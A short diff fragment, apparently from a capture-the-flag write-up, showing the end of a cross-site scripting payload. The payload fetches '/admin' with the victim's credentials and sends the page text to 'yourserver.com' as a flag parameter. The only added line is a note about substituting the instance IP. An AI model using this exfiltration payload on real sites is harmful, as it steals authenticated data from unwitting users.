@@ -97,3 +97,5 @@ const resp = await parent.fetch("/admin", { credentials: "include" });
 fetch(`http://yourserver.com?flag=${await resp.text()}`)
 </script>
 ```
+
+note: replace `http://localhost:3000` with instance ip 
